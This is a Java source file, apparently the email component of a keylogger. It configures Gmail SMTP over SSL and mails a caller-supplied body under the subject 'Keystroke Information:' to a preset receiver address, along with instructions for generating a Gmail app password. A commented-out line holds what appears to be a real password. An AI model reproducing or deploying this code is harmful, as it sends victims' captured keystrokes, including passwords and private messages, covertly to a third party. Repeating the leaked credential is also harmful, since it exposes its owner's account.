package handlers;

import java.util.Properties;

import javax.mail.Message.RecipientType;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class Sender {
	
	private Sender(){};
	private static final String SENDERS_GMAIL = "yourmail";
	private static final String SENDERS_PASSWORD = "yourpass";
	//private static final String SENDERS_PASSWORD = "panopan4i";
	private static final String RECEIVER_EMAIL = "yourmail";
	/*
	  	1.Enable 2-Step Verification (if it's not already):
		Go to Google Account Security Settings.
    	Scroll down to "Signing in to Google" and turn on 2-Step Verification.
    	2.Generate App-Specific Password:
		Go to App Passwords.
    	Sign in if prompted.
    	Select "Mail" as the app and "Other" as the device, then generate the password.
    	Use this 16-character password in your code instead of your regular Gmail password.
	 */
	private static Properties mailServerProperties;
	private static Session mailSession;
	private static MimeMessage mailMessage;
	
	public static void sendMail(String emailBody) throws Throwable {
		// Set up mail server properties
		mailServerProperties = System.getProperties();
		mailServerProperties.put("mail.smtp.port", "465"); // or 587 for TLS
		mailServerProperties.put("mail.smtp.auth", "true");
		mailServerProperties.put("mail.smtp.ssl.enable", "true");  // Use SSL
		mailServerProperties.put("mail.smtp.ssl.protocols", "TLSv1.2");
		
		// Authenticate the session
		mailSession = Session.getDefaultInstance(mailServerProperties, new javax.mail.Authenticator() {
			protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
				return new javax.mail.PasswordAuthentication(SENDERS_GMAIL, SENDERS_PASSWORD);
			}
		});
		
		// Enable debug information
		mailSession.setDebug(true);
		
		// Prepare the email
		mailMessage = new MimeMessage(mailSession);
		mailMessage.addRecipient(RecipientType.TO, new InternetAddress(RECEIVER_EMAIL));
		mailMessage.setSubject("Keystroke Information:");
		mailMessage.setContent(emailBody, "text/html");
		
		// Send the email
		Transport transport = mailSession.getTransport("smtp");
		transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
		transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
		
		// Close the transport
		transport.close();
	}
}